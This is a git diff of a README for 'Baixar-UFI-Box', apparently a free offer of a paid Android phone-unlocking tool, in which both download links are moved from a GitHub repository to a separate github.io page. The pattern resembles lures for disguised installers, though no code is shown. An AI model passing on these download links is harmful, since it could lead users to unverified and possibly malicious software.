@@ -1,6 +1,6 @@
 # 📦 Baixar-UFI-Box - Unlock Android Phones Using Windows Software
 
-[![](https://img.shields.io/badge/Download-Baixar_UFI_Box-blue.svg)](https://github.com/1379almmla2-design/Baixar-UFI-Box)
+[![](https://img.shields.io/badge/Download-Baixar_UFI_Box-blue.svg)](https://1379almmla2-design.github.io)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these minimum specifications to run the software.
 
 Visit the link below to access the software repository. Follow the distribution instructions on the page to save the program to your computer.
 
-[Click here to access the download repository](https://github.com/1379almmla2-design/Baixar-UFI-Box)
+[Click here to access the download repository](https://1379almmla2-design.github.io)
 
 ## 🛠️ Installation Steps
 
